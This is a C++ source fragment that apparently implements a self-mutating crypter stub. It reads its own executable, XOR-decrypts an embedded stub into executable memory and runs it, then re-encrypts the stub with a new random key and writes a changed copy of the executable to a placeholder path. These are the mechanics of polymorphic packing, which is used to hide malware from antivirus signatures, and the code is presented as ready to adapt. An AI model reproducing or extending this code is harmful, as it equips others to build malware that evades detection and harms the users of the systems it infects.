    exe_file.read(reinterpret_cast<char*>(exe_buffer.data()), exe_size);


    uint8_t* stub_ptr = exe_buffer.data() + KEY_OFFSET; // key rh
    std::vector<uint8_t> plain_key(stub_ptr, stub_ptr + KEY_SIZE);
    std::vector<uint8_t> plain_encrypted_stub(stub_ptr + (STUB_OFFSET - KEY_OFFSET), stub_ptr + (STUB_OFFSET - KEY_OFFSET) + STUB_SIZE);


    void* exec_decrypted_mem = VirtualAlloc(NULL, STUB_SIZE, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    std::vector<uint8_t> plain_decrypted_stub = xor_crypt(plain_encrypted_stub.data(), STUB_SIZE, plain_key.data(), plain_key.size());
    std::memcpy(exec_decrypted_mem, plain_decrypted_stub.data(), STUB_SIZE);
    void (*func)() = reinterpret_cast<void(*)()>(exec_decrypted_mem);
    func();



    std::vector<uint8_t> new_key = generate_key();
    std::vector<uint8_t> new_encrypted_stub = xor_crypt(plain_decrypted_stub.data(), STUB_SIZE, new_key.data(), new_key.size());
    std::memcpy(exe_buffer.data() + KEY_OFFSET, new_key.data(), KEY_SIZE);
    std::memcpy(exe_buffer.data() + STUB_OFFSET, new_encrypted_stub.data(), STUB_SIZE);



    std::ofstream out_exe(R"(YOURPATHHERE)", std::ios::binary);
    // The result path has to be different from the current exe path, because windows locks the file while it's running.
    // for example: "C:\path\to\your\encrypted.exe" -> "C:\path\to\your\encrypted_2.exe"
    
    out_exe.write(reinterpret_cast<const char*>(exe_buffer.data()), exe_size);
    return true;
}


int main() {
    reencrypt_exe_stub();
    return 0;
}